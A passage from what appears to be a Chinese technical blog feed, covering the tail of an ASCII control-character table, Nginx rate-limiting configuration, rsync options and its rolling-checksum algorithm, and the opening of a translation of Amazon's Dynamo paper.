1010</td><td align="center">10</td><td align="center">0x0A</td><td align="center">LF</td><td align="center">换行键</td></tr><tr><td align="center">0000 1011</td><td align="center">11</td><td align="center">0x0B</td><td align="center">VT</td><td align="center">垂直定位符号</td></tr><tr><td align="center">0000 1100</td><td align="center">12</td><td align="center">0x0C</td><td align="center">FF</td><td align="center">换页键</td></tr><tr><td align="center">0000 1101</td><td align="center">13</td><td align="center">0x0D</td><td align="center">CR</td><td align="center">归位键</td></tr><tr><td align="center">0000 1110</td><td align="center">14</td><td align="center">0x0E</td><td align="center">SO</td><td align="center">取消变换（Shift out）</td></tr><tr><td align="center">0000 1111</td><td align="center">15</td><td align="center">0x0F</td><td align="center">SI</td><td align="center">启用变换（Shift in）</td></tr><tr><td align="center">0001 0000</td><td align="center">16</td><td align="center">0x10</td><td align="center">DLE</td><td align="center">跳出数据通讯</td></tr><tr><td align="center">0001 0001</td><td align="center">17</td><td align="center">0x11</td><td align="center">DC1</td><td align="center">设备控制一（XON 启用软件速度控制）</td></tr><tr><td align="center">0001 0010</td><td align="center">18</td><td align="center">0x12</td><td align="center">DC2</td><td align="center">设备控制二</td></tr><tr><td align="center">0001 0011</td><td align="center">19</td><td align="center">0x13</td><td align="center">DC3</td><td align="center">设备控制三（XOFF 停用软件速度控制）</td></tr><tr><td align="center">0001 0100</td><td align="center">20</td><td align="center">0x14</td><td align="center">DC4</td><td align="center">设备控制四</td></tr><tr><td align="center">0001 0101</td><td align="center">21</td><td align="center">0x15</td><td align="center">NAK</td><td align="center">确认失败回应</td></tr><tr><td align="center">0001 0110</td><td align="center">22</td><td align="center">0x16</td><td align="center">SYN</td><td align="center">同步用暂停</td></tr><tr><td align="center">0001 0111</td><td align="center">23</td><td align="center">0x17</td><td align="center">ETB</td><td align="center">区块传输结束</td></tr><tr><td align="center">0001 1000</td><td align="center">24</td><td align="center">0x18</td><td align="center">CAN</td><td align="center">取消</td></tr><tr><td align="center">0001 1001</td><td align="center">25</td><td align="center">0x19</td><td align="center">EM</td><td align="center">连接介质中断</td></tr><tr><td align="center">0001 1010</td><td align="center">26</td><td align="center">0x1A</td><td align="center">SUB</td><td align="center">替换</td></tr><tr><td align="center">0001 1011</td><td align="center">27</td><td align="center">0x1B</td><td align="center">ESC</td><td align="center">跳出</td></tr><tr><td align="center">0001 1100</td><td align="center">28</td><td align="center">0x1C</td><td align="center">FS</td><td align="center">文件分割符</td></tr><tr><td align="center">0001 1101</td><td align="center">29</td><td align="center">0x1D</td><td align="center">GS</td><td align="center">组群分隔符</td></tr><tr><td align="center">0001 1110</td><td align="center">30</td><td align="center">0x1E</td><td align="center">RS</td><td align="center">记录分隔符</td></tr><tr><td align="center">0001 1111</td><td align="center">31</td><td align="center">0x1F</td><td align="center">US</td><td align="center">单元分隔符</td></tr><tr><td align="center">0111 1111</td><td align="center">127</td><td align="center">0x7F</td><td align="center">DEL</td><td align="center">删除</td></tr></tbody></table><h2 id="十、在线编码网站"><a href="#十、在线编码网站" class="headerlink" title="十、在线编码网站"></a>十、在线编码网站</h2><ul><li><p><a href="https://www.qtool.net/baseencode">Base编码转换</a>：支持Base16、32、36、58、62、64、85、91等类型的编解码；</p></li><li><p><a href="http://extraconversion.com/base-number/base-36">Conversion Tool</a>：支持超多种的Base类型的编解码转换；</p></li><li><p><a href="http://www.gongjumi.com/Encode/Ascii85Base85">Base85编解码</a>、<a href="http://www.gongjumi.com/Encode/Base64">Base64编解码</a>；</p></li><li><p><a href="https://www.dcode.fr/base-91-encoding">Base91-Encoding</a>；</p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Algorithm </tag>
            
            <tag> Linux </tag>
            
            <tag> Base </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ngxin的限流方式</title>
      <link href="/2019/10/30/nginx-current-limiting/"/>
      <url>/2019/10/30/nginx-current-limiting/</url>
      
        <content type="html"><![CDATA[<h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p><a href="https://nginx.org/en/">Nginx</a>的限流的实现，可以保证高并发场景下的服务的可用性，控制网络以及CPU&#x2F;内存负载，极端场景下还可以减小暴力破解对系统的危害性。Nginx本身自带了几个限流模块 ：</p><ul><li><p>对客户端的限流模块：</p><ul><li><a href="http://nginx.org/en/docs/http/ngx_http_limit_conn_module.html">ngx_http_limit_conn_module</a>：按照连接数限流，限制单个IP的并发连接数；</li><li><a href="http://nginx.org/en/docs/http/ngx_http_limit_req_module.html">ngx_http_limit_req_module</a>：按照请求速率限流，使用漏桶的方式限制请求的处理速率；</li></ul></li><li><p>对服务端的限流模块：</p><ul><li><a href="http://nginx.org/en/docs/http/ngx_http_upstream_module.html">ngx_http_upstream_module</a>：用于定义可以由<code>proxy_pass</code>， <code>fastcgi_pass</code>， <code>uwsgi_pass</code>， <code>scgi_pass</code>， <code>memcached_pass</code>和 <code>grpc_pass</code>指令引用的服务器组；</li></ul></li></ul><h2 id="二、限流模块"><a href="#二、限流模块" class="headerlink" title="二、限流模块"></a>二、限流模块</h2><h3 id="2-1、ngx-http-limit-conn-module"><a href="#2-1、ngx-http-limit-conn-module" class="headerlink" title="2.1、ngx_http_limit_conn_module"></a>2.1、ngx_http_limit_conn_module</h3><p>用于设置单IP最大允许的连接数，当超过该连接数，服务器将返回错误信息（默认错误码为<code>503</code>）。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http &#123;</span><br><span class="line">    limit_conn_zone <span class="variable">$binary_remote_addr</span> zone=one:10m;</span><br><span class="line">    ...</span><br><span class="line">    server &#123;</span><br><span class="line">        ...</span><br><span class="line">        location /download/ &#123;</span><br><span class="line">            limit_conn one 10;</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p><code>limit_conn_zone</code>：</p><ul><li>语法：<code>limit_conn_zone key zone=name:size;</code></li><li>示例解释：设置共享内存的大小，用于存储各Client的状态，其中<code>zone</code>配置对应的值可以自定义；</li><li>配置位置：可配置于<code>http</code>中；</li></ul></li><li><p><code>limit_conn</code>：</p><ul><li>语法：<code>limit_conn zone number;</code></li><li>示例解释：访问<code>/download/</code>地址的IP可以允许同时存在<code>10</code>个连接，其中<code>one</code>可以为其他值，需要保持与<code>limit_conn_zone</code>配置中的<code>zone</code>后的信息对应；</li><li>配置位置：可配置于<code>http</code>、<code>server</code>、<code>location</code>中；</li></ul></li><li><p>更多参数请参考<code>ngx_http_limit_conn_module</code>模块的<a href="http://nginx.org/en/docs/http/ngx_http_limit_conn_module.html">官方文档</a>；</p></li></ul><h3 id="2-2、ngx-http-limit-req-module"><a href="#2-2、ngx-http-limit-req-module" class="headerlink" title="2.2、ngx_http_limit_req_module"></a>2.2、ngx_http_limit_req_module</h3><p>使用令牌桶的方式限制每个Client的请求处理速率，如果请求的速率超过限制则会被延迟处理，当数量超过突发值时会返回错误信息（默认错误码为<code>503</code>）。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http &#123;</span><br><span class="line">    limit_req_zone <span class="variable">$binary_remote_addr</span> zone=one:10m rate=1r/s;</span><br><span class="line">    ...</span><br><span class="line">    server &#123;</span><br><span class="line">        ...</span><br><span class="line">        location /search/ &#123;</span><br><span class="line">            limit_req zone=one burst=5;</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p><code>limit_req_zone</code>：</p><ul><li>语法：<code>limit_req_zone key zone=name:size rate=rate[sync];</code></li><li>示例解释：分配<code>10m</code>大小的共享内存存储客户端的状态，每个地址每秒只能请求<code>1</code>次；</li><li>配置位置：可配置于<code>http</code>中；</li></ul></li><li><p><code>limit_req</code>：</p><ul><li>语法：<code>limit_req zone=name [burst=number] [nodelay | delay=number]</code>；</li><li>示例解释：令牌桶一共有<code>5</code>块令牌，并且每秒钟只新增<code>1</code>块令牌，5块令牌发完后，多出来的请求就会返回<code>503</code>；</li><li>配置位置：可配置于<code>http</code>、<code>server</code>、<code>location</code>中；</li></ul></li><li><p>更多参数请参考<code>ngx_http_limit_req_module</code>模块的<a href="http://nginx.org/en/docs/http/ngx_http_limit_req_module.html">官方文档</a>；</p></li></ul><h3 id="2-3、ngx-http-upstream-module"><a href="#2-3、ngx-http-upstream-module" class="headerlink" title="2.3、ngx_http_upstream_module"></a>2.3、ngx_http_upstream_module</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">upstream backend &#123;</span><br><span class="line">    server backend1.example1.com:8083 max_conns=10;</span><br><span class="line">    server backend2.example2.com:8084 max_conns=10;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">    location / &#123;</span><br><span class="line">        proxy_pass http://backend;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>max_conns：从1.5.9版本后开支持该参数（商业版本中），从1.11.5版本之后非商业版本也可以使用；</p><ul><li>语法：<code>max_conns=number</code></li><li>示例解释：限制连接后端服务器的最大连接数为<code>10</code>；</li><li>配置位置：可配置于<code>upstream</code>中；</li></ul></li><li><p>更多参数请参考<code>ngx_http_upstream_module</code>模块的<a href="http://nginx.org/en/docs/http/ngx_http_upstream_module.html">官方文档</a>；</p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Nginx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>rsync指令的使用与算法解析 - 每周指令</title>
      <link href="/2019/10/20/command-rsync/"/>
      <url>/2019/10/20/command-rsync/</url>
      
        <content type="html"><![CDATA[<h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p><a href="https://rsync.samba.org/">rsync</a>命令是一个远程数据同步工具，可通过<code>LAN/WAN</code>快速同步多台主机间的文件。rsync使用所谓的<code>rsync算法</code>来使本地和远程两个主机之间的文件达到同步，这个算法只传送两个文件的不同部分，而不是每次都整份传送，因此速度相当快。 <code>rsync</code>是一个功能非常强大的工具，其命令也有很多功能特色选项，我们下面就对它的选项一一进行分析说明。</p><h2 id="二、参数解析"><a href="#二、参数解析" class="headerlink" title="二、参数解析"></a>二、参数解析</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-v, --verbose 详细模式输出。</span><br><span class="line">-q, --quiet 精简输出模式。</span><br><span class="line">-c, --checksum 打开校验开关，强制对文件传输进行校验。</span><br><span class="line">-a, --archive 归档模式，表示以递归方式传输文件，并保持所有文件属性，等于-rlptgoD。</span><br><span class="line">-r, --recursive 对子目录以递归模式处理。</span><br><span class="line">-R, --relative 使用相对路径信息。</span><br><span class="line">-b, --backup 创建备份，也就是对于目的已经存在有同样的文件名时，将老的文件重新命名为~filename。可以使用--suffix选项来指定不同的备份文件前缀。</span><br><span class="line">--backup-dir 将备份文件(如~filename)存放在在目录下。</span><br><span class="line">-suffix=SUFFIX 定义备份文件前缀。</span><br><span class="line">-u, --update 仅仅进行更新，也就是跳过所有已经存在于DST，并且文件时间晚于要备份的文件，不覆盖更新的文件。</span><br><span class="line">-l, --links 保留软链结。</span><br><span class="line">-L, --copy-links 想对待常规文件一样处理软链结。</span><br><span class="line">--copy-unsafe-links 仅仅拷贝指向SRC路径目录树以外的链结。</span><br><span class="line">--safe-links 忽略指向SRC路径目录树以外的链结。</span><br><span class="line">-H, --hard-links 保留硬链结。</span><br><span class="line">-p, --perms 保持文件权限。</span><br><span class="line">-o, --owner 保持文件属主信息。</span><br><span class="line">-g, --group 保持文件属组信息。</span><br><span class="line">-D, --devices 保持设备文件信息。</span><br><span class="line">-t, --<span class="built_in">times</span> 保持文件时间信息。</span><br><span class="line">-S, --sparse 对稀疏文件进行特殊处理以节省DST的空间。</span><br><span class="line">-n, --dry-run现实哪些文件将被传输。</span><br><span class="line">-w, --whole-file 拷贝文件，不进行增量检测。</span><br><span class="line">-x, --one-file-system 不要跨越文件系统边界。</span><br><span class="line">-B, --block-size=SIZE 检验算法使用的块尺寸，默认是700字节。</span><br><span class="line">-e, --rsh=<span class="built_in">command</span> 指定使用rsh、ssh方式进行数据同步。</span><br><span class="line">--rsync-path=PATH 指定远程服务器上的rsync命令所在路径信息。</span><br><span class="line">-C, --cvs-exclude 使用和CVS一样的方法自动忽略文件，用来排除那些不希望传输的文件。</span><br><span class="line">--existing 仅仅更新那些已经存在于DST的文件，而不备份那些新创建的文件。</span><br><span class="line">--delete 删除那些DST中SRC没有的文件。</span><br><span class="line">--delete-excluded 同样删除接收端那些被该选项指定排除的文件。</span><br><span class="line">--delete-after 传输结束以后再删除。</span><br><span class="line">--ignore-errors 及时出现IO错误也进行删除。</span><br><span class="line">--max-delete=NUM 最多删除NUM个文件。</span><br><span class="line">--partial 保留那些因故没有完全传输的文件，以是加快随后的再次传输。</span><br><span class="line">--force 强制删除目录，即使不为空。</span><br><span class="line">--numeric-ids 不将数字的用户和组<span class="built_in">id</span>匹配为用户名和组名。</span><br><span class="line">--<span class="built_in">timeout</span>=time ip超时时间，单位为秒。</span><br><span class="line">-I, --ignore-times 不跳过那些有同样的时间和长度的文件。</span><br><span class="line">--size-only 当决定是否要备份文件时，仅仅察看文件大小而不考虑文件时间。</span><br><span class="line">--modify-window=NUM 决定文件是否时间相同时使用的时间戳窗口，默认为0。</span><br><span class="line">-T --temp-dir=DIR 在DIR中创建临时文件。</span><br><span class="line">--compare-dest=DIR 同样比较DIR中的文件来决定是否需要备份。</span><br><span class="line">-P 等同于 --partial。</span><br><span class="line">--progress 显示备份过程。</span><br><span class="line">-z, --compress 对备份的文件在传输时进行压缩处理。</span><br><span class="line">--exclude=PATTERN 指定排除不需要传输的文件模式。</span><br><span class="line">--include=PATTERN 指定不排除而需要传输的文件模式。</span><br><span class="line">--exclude-from=FILE 排除FILE中指定模式的文件。</span><br><span class="line">--include-from=FILE 不排除FILE指定模式匹配的文件。</span><br><span class="line">--version 打印版本信息。</span><br><span class="line">--address 绑定到特定的地址。</span><br><span class="line">--config=FILE 指定其他的配置文件，不使用默认的rsyncd.conf文件。</span><br><span class="line">--port=PORT 指定其他的rsync服务端口。</span><br><span class="line">--blocking-io 对远程shell使用阻塞IO。</span><br><span class="line">-stats 给出某些文件的传输状态。</span><br><span class="line">--progress 在传输时现实传输过程。</span><br><span class="line">--log-format=formAT 指定日志文件格式。</span><br><span class="line">--password-file=FILE 从FILE中得到密码，格式为文件中单行写入密码</span><br><span class="line">--bwlimit=KBPS 限制I/O带宽，KBytes per second。</span><br><span class="line">-h, --<span class="built_in">help</span> 显示帮助信息。</span><br></pre></td></tr></table></figure><h2 id="三、工作模式"><a href="#三、工作模式" class="headerlink" title="三、工作模式"></a>三、工作模式</h2><p><code>rsync</code>有<code>六种</code>不同的工作模式，详细介绍如下：</p><ul><li><p><strong>拷贝本地文件</strong>：</p><ul><li><code>规则</code>：当<code>SRC</code>和<code>DES</code>路径信息都不包含有单个冒号<code>:</code>分隔符时就启动该模式；</li><li><code>语法</code>：<code>rsync [OPTION]... SRC DEST</code>；</li><li><code>示例``：</code>rsync -a &#x2F;data &#x2F;backup&#96;；</li></ul></li><li><p><strong>将本地机器的内容拷贝到远程机器</strong>：</p><ul><li><code>规则</code>：当<code>DST</code>路径地址包含单个冒号<code>:</code>分隔符时启动该模式；</li><li><code>语法</code>：<code>rsync [OPTION]... SRC [USER@]host:DEST</code>；</li><li><code>示例</code>：<code>rsync -avz *.c foo:src</code></li></ul></li><li><p><strong>将远程机器的内容拷贝到本地机器</strong>：</p><ul><li><code>规则</code>：当<code>SRC</code>地址路径包含单个冒号<code>:</code>分隔符时启动该模式；</li><li><code>语法</code>：<code>rsync [OPTION]... [USER@]HOST:SRC DEST</code>；</li><li><code>示例</code>：<code>rsync -avz foo:src/bar /data</code>；</li></ul></li><li><p><strong>从远程<code>rsync</code>服务器中拷贝文件到本地机</strong>：</p><ul><li><code>规则</code>：当<code>SRC</code>路径信息包含<code>::</code>分隔符时启动该模式；</li><li><code>语法</code>：<code>rsync [OPTION]... [USER@]HOST::SRC DEST</code>；</li><li><code>示例</code>：<code>rsync -av root@192.168.78.192::www /databack</code>；</li></ul></li><li><p><strong>从本地机器拷贝文件到远程<code>rsync</code>服务器</strong>：</p><ul><li><code>规则</code>：当<code>DST</code>路径信息包含<code>::</code>分隔符时启动该模式；</li><li><code>语法</code>：<code>rsync [OPTION]... SRC [USER@]HOST::DEST</code>；</li><li><code>示例</code>：<code>rsync -av /databack root@192.168.78.192::www</code>；</li></ul></li><li><p><strong>列出远程机的文件列表</strong>：</p><ul><li><code>规则</code>：命令中省略掉本地机信息；</li><li><code>语法</code>：<code>rsync [OPTION]... rsync://[USER@]HOST[:PORT]/SRC [DEST]</code>；</li><li><code>示例</code>：<code>rsync -v rsync://192.168.78.192/www</code>；</li></ul></li></ul><h2 id="四、rsync的算法解析"><a href="#四、rsync的算法解析" class="headerlink" title="四、rsync的算法解析"></a>四、rsync的算法解析</h2><h3 id="4-1、分块checksum算法"><a href="#4-1、分块checksum算法" class="headerlink" title="4.1、分块checksum算法"></a>4.1、分块checksum算法</h3><p>首先，我们会把 <code>DST文件 </code>的文件均切分成若干小块，例如每块大小为512个字节（最后一块会小于这个数），然后对每块计算两个<code>checksum</code>，计算checksum使用的算法如下：</p><ul><li><code>rolling checksum（轮替校验和）</code>：这是一种弱checksum，会产生32位的checksum，使用的是Mark Adler发明的<a href="http://en.wikipedia.org/wiki/Adler-32">adler-32算法</a>，用来快速弱检验是否相同；</li><li><code>强checksum</code>：会产生128位的checksum，之前使用的是md4，现在使用的md5 hash算法，用来精准校验是否相同；</li></ul><p><img src="https://cdn.bugwz.com/rsync-checksum.png" alt="checksum校验"></p><h3 id="4-2、传输算法"><a href="#4-2、传输算法" class="headerlink" title="4.2、传输算法"></a>4.2、传输算法</h3><p>同步目标端会把<code>DST文件</code>的的一个<code>checksum列表</code>传给同步源，这个列表里包括了三个东西：</p><ul><li>rolling checksum(32bits)</li><li>md5 checksum(128bits)</li><li>文件块编号</li></ul><h3 id="4-3、checksum查找算法"><a href="#4-3、checksum查找算法" class="headerlink" title="4.3、checksum查找算法"></a>4.3、checksum查找算法</h3><p>同步源端拿到<code>DST文件</code>的<code>checksum数组</code>后，会把这个数据存到一个<code>hash table</code>中，用<code>rolling checksum</code>做<code>hash</code>，以便获得<code>O(1)</code>时间复杂度的查找性能，<code>hash表</code>大小为<code>16bits</code>的，因此<code>hash表</code>槽位为<code>2的16次方</code>，同时使用链表来解决碰撞冲突。</p><p><img src="https://cdn.bugwz.com/rsync-dst-checksum-hash-table.png" alt="DST文件块checksum组成的hash表"></p><h3 id="4-4、比对算法"><a href="#4-4、比对算法" class="headerlink" title="4.4、比对算法"></a>4.4、比对算法</h3><ul><li>取<code>SRC文件</code>的<code>第一个</code>文件块（假设文件块大小为<code>512</code>），也就是从<code>SRC文件</code>的第1个字节到第512个字节，取出来后做<code>rolling checksum</code>计算，在<code>hash表</code>中查找计算好的值：<ul><li><code>找到对应的checksum</code>：<ul><li>由于<code>rolling checksum</code>是一个弱checksum，因为尝试比较<code>md5</code>的<code>checksum</code>，经过两次的<code>checksum</code>比较，最终仍旧发生冲突的概率为<code>1/(2^160)</code>，这种冲突概率太小，忽略不计；</li><li>在比较<code>md5</code>的<code>checksum</code>后，如果可以找到对应的匹配项，则表示在<code>SRC文件</code>和<code>DST文件</code>中有相同的文件块；</li></ul></li><li><code>未找到对应的checksum</code>：只要<code>rolling checksum</code> 或 <code>md5 checksum</code> 其中有一个在<code>DST文件</code>的<code>checksum hash表</code>中找不到匹配项，那么就会触发算法对<code>SRC文件</code>的<code>rolling</code>动作，比对算法会住后移动<code>1个字节</code>，对<code>SRC文件</code>的字节位置为<code>2-513</code>的文件块要做<code>checksum</code>  (需要特别注意：<strong>这里在原有<code>checksum</code>的基础上进行调整就可以得出新的<code>checksum</code>，而不必重新计算<code>checksum</code>，这也是<code>rolling</code>的精髓</strong>)；</li></ul></li></ul><p><img src="https://cdn.bugwz.com/rsync-chunk-comparison.png" alt="数据比对"></p><p>最终，在同步源这端，我们的rsync算法可能会得到下面这个样子的一个数据数组，图中，红色块表示在目标端已匹配上，不用传输（注：<strong>图中存在两块<code>Chunk #5</code>指的是两个文件块在计算<code>checksum</code>的时候存在<code>hash冲突</code>，使用了链表进行解决</strong>），而白色的地方就是需要传输的内容（注意：这些白色的块是不定长的），这样，同步源这端把这个数组（白色的就是实际内容，红色的就放一个标号）压缩传到目的端，在目的端的rsync会根据这个表重新生成文件，这样，同步完成。</p><p><img src="https://cdn.bugwz.com/rsync-after-data-comparison.png" alt="数据比对后"></p><h3 id="4-5、补充文档"><a href="#4-5、补充文档" class="headerlink" title="4.5、补充文档"></a>4.5、补充文档</h3><ul><li><a href="https://www.samba.org/~tridge/phd_thesis.pdf">Andrew Tridgell 关于排序和同步算法的博士论文</a></li><li><a href="https://rsync.samba.org/tech_report/">rsync算法官方介绍</a></li></ul><p>参考文档：<a href="https://coolshell.cn/articles/7425.html">https://coolshell.cn/articles/7425.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Commands </tag>
            
            <tag> rsync </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>转/译-Dynamo:Amazon的高可用键值存储</title>
      <link href="/2019/10/14/dynamo/"/>
      <url>/2019/10/14/dynamo/</url>
      
        <content type="html"><![CDATA[<h3 id="译者序"><a href="#译者序" class="headerlink" title="译者序"></a>译者序</h3><p>本文翻译自 2007 年 Amazon 的分布式存储经典论文：<strong>Dynamo: Amazon’s Highly Available Key-value Store</strong> (<a href="https://www.allthingsdistributed.com/files/amazon-dynamo-sosp2007.pdf">PDF</a>)。</p><p>标题直译为：<strong>《Dynamo：Amazon 的高可用键值仓库（存储）》</strong>。</p><p>对排版做了一些调整，以更适合 web 阅读。</p><p>Dynamo 是 Amazon 的高可用分布式键值存储（key&#x2F;value storage）系统。这篇论文发表 的时候（2007）它还只是一个内部服务，现在（改名为 DynamoDB）已经发展成 AWS 最核心 的存储产品（服务）之一，与 S3 等并列。据了解，国内某一线大厂的公有云键值 存储服务，也是参考这篇文章设计和实现的。</p><p>现在提到键值存储，大家首先想到的可能是 Redis，那么 Dynamo 和 Redis 是不是竞品， 只是一个开源一个是商业的？不是的，二者针对的场景不同，这里非常粗地列举几方面：</p><ol><li>使用场景：Dynamo 定位是永远可写（always writable）的持久文件系统，Redis 主要用作（易失）缓存或内存数据库</li><li>存储方式：Dynamo 是磁盘，Redis 是内存</li><li>系统规模：Dynamo 是<strong>分布式</strong>（distributed）存储系统，设计之初（2006）就能支 撑几百台 node；Redis 是<strong>单机或集群（主从复制</strong>），规模不同</li><li>性能指标：以上差异必然导致各自设计时的性能考虑（例如延迟、吞吐、容错等）和实 际的性能量级不同</li></ol><p>精读一篇经典比泛读几十篇水文收获要大的多，尤其是那些领域开山之作。这篇论文适合精读。</p><p><strong>翻译仅供个人学习交流。由于译者水平有限，本文不免存在遗漏或错误之处。如有疑问， 请查阅原文。</strong></p><p>以下是译文。</p><hr><h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>Amazon 是世界上最大的电商之一。</p><p>在这里我们所遇到的最大挑战之一就是<strong>超大规模下的稳定性问题</strong>（reliability at massive scale）。即使是最微小的故障（the slightest outage），也会造成巨大的经济 损失，而且会降低客户对我们的信任。Amazon.com 作为一个为全球提供 web 服务的平台， 其底层的基础设施是由分布在全球的数据中心中成千上万的服务器和网络设备组成的。在如 此庞大的规模下，大大小小的组件故障是不断在发生的，而我们应对这些故障时所采取 的<strong>管理持久状态的方式</strong>（the way persistent state is managed），<strong>驱动着软件系 统的可靠性（reliability）和可扩展性（scalability）的发展</strong>。</p><p>本文介绍 Dynamo —— 一个<strong>高可用键值存储系统</strong> —— 的设计和实现。Amazon 的一些核心 服务就是基于 Dynamo 提供不间断服务的（always-on experience）。为了达到这种等级的 可用性（level of availability），Dynamo <strong>牺牲了几种特定故障场景下的一致性</strong>。另 外，Dynamo 大量使用了<strong>对象版本化</strong>（object versioning）和<strong>应用协助的冲突解决</strong> （application-assisted conflict resolution）机制，给开发者提供了一种新颖的接口。</p><h2 id="1-引言"><a href="#1-引言" class="headerlink" title="1. 引言"></a>1. 引言</h2><p>Amazon 是一个全球电商平台，峰值用户达到几千万。支撑 Amazon 的是分布在全球的数据 中心中成千上万的服务器。Amazon 平台对<strong>性能、可靠性和效率</strong>等指标有着很高的要求 。而且，为了支撑持续增长（continous growth），平台需要有<strong>高度的可扩展性</strong>。<strong>可 靠性是我们最重要的需求之一</strong>，因为即使是最微小的故障也会造成巨大的经济损失，而且 会降低客户对我们的信任。</p><p>我们从打造 Amazon 平台的切身实践中总结出的一条经验是：<strong>一个系统的可靠性和可扩展 性取决于如何管理它的应用状态</strong>。</p><blockquote><p>The reliability and scalability of a system is dependent on how its application state is managed.</p></blockquote><p>Amazon 使用的是高度去中心化的、松耦合的、面向服务的架构，由几百个服务组成。这样 的环境对<strong>永远可用</strong>（always available）的存储技术有着强烈的需求。例如，<strong>即使磁 盘挂掉、路由抖动、甚至数据中心被飓风摧毁，用户应该仍然能向他们的购物车添加和查看 商品</strong>。要实现这样的目标，管理购物车的系统就必须永远能读写它的 数据仓库，而且 数据仓库还要跨多个数据中心可用。</p><p>对于我们这种由几百万台设备组成的基础设施，故障是家常便饭；在任何时刻都会有<strong>比例小 但数量不少</strong>（small but significant number）的服务器和网络设备发生故障。因此， Amazon 的软件系统要<strong>将故障视为正常的、可预期的行为（treat failure handling as the normal case），不应因设备故障而影响可用性和性能</strong>。</p><p>为了满足可靠性和可扩展性的需求，Amazon 开发了一些存储技术，S3 （Simple Storage Service）可能是最广为人知的一种。本文介绍 Amazon 的另一个存储产品 Dynamo —— 一个 高可用键值存储数据仓库（data store）—— 的设计和实现。</p><p>Dynamo 用于管理<strong>对可靠性要求非常高的服务</strong>的状态，这些服务还要求对可靠性、一致 性、成本-效率（cost-effectiveness）和性能有很强的控制能力。</p><blockquote><p>Dynamo is used to manage the state of services that have very high reliability requirements and need tight control over the tradeoffs between availability, consistency, cost-effectiveness and performance.</p></blockquote><p>Amazon 平台有很多类型的应用，不同的类型对存储的需求差异很大。例如，其中一类应用 希望能 <strong>数据仓库的配置足够灵活，以便在成本最经济的方式下，由开发者来决定如何 在可用性和性能之间取得折中</strong>。</p><p>Amazon 的一些服务<strong>只需以主键（primary key）的方式访问数据仓库</strong>。对于很多服 务，例如畅销排行榜、购物车、客户喜好偏向、session 管理、销售排名、商品目录等等， 常见的关系型数据库会非常低效，而且限制了规模的扩展性和可用性。Dynamo 提供了只使 用主键（primary key only）的访问接口来满足这类应用的需求。</p><p><strong>Dynamo 基于一些众所周知的（well known）技术实现了可扩展性和高可用性</strong>：</p><ul><li>数据通过<strong>一致性哈希</strong>分散和复制（partitioned and replicated）[10]</li><li>通过<strong>对象版本化</strong>（object versioning）实现一致性 [12]</li><li>副本之间的一致性由一种<strong>类似仲裁的技术</strong>（quorum-like technique）和一个去中 心化的<strong>副本同步协议</strong>（replica synchroni protocol）保证</li><li>gossip-based 分布式故障检测和成员检测（membership）协议</li></ul><p>Dynamo 是一个只需最少人工管理的、完全去中心化的系统。</p><blockquote><p>Dynamo is a completely decentralized system with minimal need for manual administration.</p></blockquote><p>向 Dynamo 添加或移除存储节点不需要人工 partition（调整哈希节点）或 redistribution（在节点之间重新平衡数据分布）。</p><p>Dynamo 在过去的几年已经成为 Amazon 很多核心服务的底层存储技术。在节假日购物高峰 ，它能实现不停服（平滑）扩容以支持极高的峰值负载。例如购物车服务的几千万请求会 产生单日 300 万次的付款动作，管理 session 状态的服务能处理几千万的并发活跃用户等 等。</p><p><strong>本文对该领域的主要贡献</strong>：</p><ul><li>评估了如何通过组合不同技术实现一个高度可用的（highly-available）系统</li><li>证明了最终一致性存储系统可以用于生产环境，满足应用的高要求</li><li>展示了若干优化技术，以满足生产环境的非常严格的性能要求</li></ul><p>本文章节结构介绍（略，见下面全文）。</p><h2 id="2-背景"><a href="#2-背景" class="headerlink" title="2. 背景"></a>2. 背景</h2><p>Amazon 的电商平台由几百个服务组成，它们协同工作，提供的服务包罗万象，从推荐系统 到订单处理到欺诈检测等等。每个服务对外提供定义良好的 API，被其他服务通过网络的方 式访问。这些服务运行在分布在全球的数据中心中，成千上万的服务器组成的基础设施之上 。有些服务是无状态的（例如，聚合其他服务的响应的服务），有些是有状态的（例如，基 于存储在数据仓库里的状态，执行业务逻辑并产生响应的服务）。</p><p>传统上，生产系统使用关系型数据库来存储状态。但对很多<strong>持久状态的存储</strong>需求来说， 关系型数据库并不是一种理想的方式。这一类型中的大多数服务只用主键去检索，并不需要 RDBMS 提供的复杂查询和管理功能。这些额外的功能需要昂贵的硬件和专门的技能，而实际 上服务根本用不到，最终的结果就是使用关系型数据库非常不经济。另外，这类数据库的复 制功能很受限，而且通常是靠<strong>牺牲可用性来换一致性</strong>。虽然近些年有了一些改进，但总 体来说水平扩展（scale-out）以及使用智能（smart）partitioning 来做负载均衡还是很不 方便。</p><p>本文介绍 Dynamo 是如何解决以上需求的。Dynamo 有易用的 key&#x2F;value 接口，高度可用 ，有定义清晰的一致性窗口（clearly defined consistency window），资源使用效率很高 ，并且有易用的水平扩展方案以解决请求量或数据增长带来的挑战。<strong>每个使用 Dynamo 的 服务，使用的都是它们独立的一套 Dynamo 系统</strong>。</p><blockquote><p>Each service that uses Dynamo runs its own Dynamo instances.</p></blockquote><h3 id="2-1-系统假设与需求"><a href="#2-1-系统假设与需求" class="headerlink" title="2.1 系统假设与需求"></a>2.1 系统假设与需求</h3><p>Dynamo 